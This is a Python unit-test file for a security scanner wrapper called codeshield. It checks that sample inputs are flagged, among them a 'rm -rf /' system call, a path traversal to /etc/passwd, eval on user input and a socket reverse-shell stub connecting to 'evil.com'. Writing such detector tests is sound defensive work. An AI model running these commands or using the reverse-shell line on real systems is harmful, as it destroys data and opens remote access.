from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from sentinel.security import codeshield
from sentinel.core.models import ScanResult


@pytest.fixture(autouse=True)
def _reset_codeshield():
    """Reset codeshield state between tests."""
    codeshield._cs_class = None
    codeshield._loaded = False
    yield
    codeshield._cs_class = None
    codeshield._loaded = False


class TestCodeShieldScan:
    @pytest.mark.asyncio
    async def test_not_loaded_returns_clean(self):
        """When not loaded, scan returns clean result (graceful degradation)."""
        result = await codeshield.scan("import os\nos.system('rm -rf /')")
        assert isinstance(result, ScanResult)
        assert result.found is False
        assert result.scanner_name == "codeshield"

    @pytest.mark.asyncio
    async def test_clean_code_passes(self):
        """Clean Python code should not be flagged."""
        mock_result = MagicMock()
        mock_result.is_insecure = False
        mock_result.issues_found = None

        mock_cs = MagicMock()
        mock_cs.scan_code = AsyncMock(return_value=mock_result)

        codeshield._cs_class = mock_cs
        codeshield._loaded = True

        result = await codeshield.scan("def hello():\n    return 'world'")
        assert result.found is False

    @pytest.mark.asyncio
    async def test_os_system_detected(self):
        """os.system() should be flagged as insecure."""
        mock_issue = MagicMock()
        mock_issue.cwe_id = "CWE-78"
        mock_issue.description = "Dangerous os.system call"
        mock_issue.line = 2

        mock_result = MagicMock()
        mock_result.is_insecure = True
        mock_result.issues_found = [mock_issue]

        mock_cs = MagicMock()
        mock_cs.scan_code = AsyncMock(return_value=mock_result)

        codeshield._cs_class = mock_cs
        codeshield._loaded = True

        result = await codeshield.scan("import os\nos.system('rm -rf /')")
        assert result.found is True
        assert len(result.matches) == 1
        assert "CWE-78" in result.matches[0].pattern_name

    @pytest.mark.asyncio
    async def test_path_traversal_detected(self):
        """Path traversal code should be flagged."""
        mock_issue = MagicMock()
        mock_issue.cwe_id = "CWE-22"
        mock_issue.description = "Path traversal attempt"
        mock_issue.line = 1

        mock_result = MagicMock()
        mock_result.is_insecure = True
        mock_result.issues_found = [mock_issue]

        mock_cs = MagicMock()
        mock_cs.scan_code = AsyncMock(return_value=mock_result)

        codeshield._cs_class = mock_cs
        codeshield._loaded = True

        result = await codeshield.scan("open('../../etc/passwd')")
        assert result.found is True

    @pytest.mark.asyncio
    async def test_eval_exec_detected(self):
        """eval/exec should be flagged."""
        mock_issue = MagicMock()
        mock_issue.cwe_id = "CWE-94"
        mock_issue.description = "eval() detected"
        mock_issue.line = 1

        mock_result = MagicMock()
        mock_result.is_insecure = True
        mock_result.issues_found = [mock_issue]

        mock_cs = MagicMock()
        mock_cs.scan_code = AsyncMock(return_value=mock_result)

        codeshield._cs_class = mock_cs
        codeshield._loaded = True

        result = await codeshield.scan("eval(user_input)")
        assert result.found is True

    @pytest.mark.asyncio
    async def test_reverse_shell_blocked(self):
        """Reverse shell code should be flagged."""
        mock_issue = MagicMock()
        mock_issue.cwe_id = "CWE-94"
        mock_issue.description = "Reverse shell detected"
        mock_issue.line = 3

        mock_result = MagicMock()
        mock_result.is_insecure = True
        mock_result.issues_found = [mock_issue]

        mock_cs = MagicMock()
        mock_cs.scan_code = AsyncMock(return_value=mock_result)

        codeshield._cs_class = mock_cs
        codeshield._loaded = True

        code = "import socket\ns=socket.socket()\ns.connect(('evil.com',4444))"
        result = await codeshield.scan(code)
        assert result.found is True

    def test_is_loaded_false_by_default(self):
        assert codeshield.is_loaded() is False

    @pytest.mark.asyncio
    async def test_insecure_no_issues_generic_match(self):
        """If is_insecure=True but no issues list, adds a generic match."""
        mock_result = MagicMock()
        mock_result.is_insecure = True
        mock_result.issues_found = []

        mock_cs = MagicMock()
        mock_cs.scan_code = AsyncMock(return_value=mock_result)

        codeshield._cs_class = mock_cs
        codeshield._loaded = True

        result = await codeshield.scan("dangerous code")
        assert result.found is True
        assert result.matches[0].pattern_name == "codeshield_insecure"

    @pytest.mark.asyncio
    async def test_scan_error_returns_clean(self):
        """If the scanner throws, return clean (fail-open for availability)."""
        mock_cs = MagicMock()
        mock_cs.scan_code = AsyncMock(side_effect=RuntimeError("Scanner crashed"))

        codeshield._cs_class = mock_cs
        codeshield._loaded = True

        result = await codeshield.scan("some code")
        assert result.found is False


class TestCodeShieldInitialize:
    def test_import_not_available(self):
        """When codeshield package is not installed, returns False gracefully."""
        with patch.dict("sys.modules", {
            "codeshield": None,
            "codeshield.insecure_code_detector": None,
            "codeshield.insecure_code_detector.oss": None,
            "codeshield.cs": None,
        }):
            result = codeshield.initialize()
            assert result is False
            assert codeshield.is_loaded() is False

    def test_successful_init(self):
        """When codeshield package is available, initialize returns True."""
        mock_oss = MagicMock()
        mock_icd = MagicMock()
        mock_icd.oss = mock_oss
        mock_cs_module = MagicMock()
        mock_cs_class = MagicMock()
        mock_cs_module.CodeShield = mock_cs_class

        with patch.dict("sys.modules", {
            "codeshield": MagicMock(),
            "codeshield.insecure_code_detector": mock_icd,
            "codeshield.insecure_code_detector.oss": mock_oss,
            "codeshield.cs": mock_cs_module,
        }):
            result = codeshield.initialize()
            assert result is True
            assert codeshield.is_loaded() is True
            assert codeshield._cs_class is mock_cs_class
            # Verify semgrep command was patched
            assert mock_oss.SEMGREP_COMMAND == [
                "semgrep", "--json", "--quiet", "--metrics", "off", "--config",
            ]
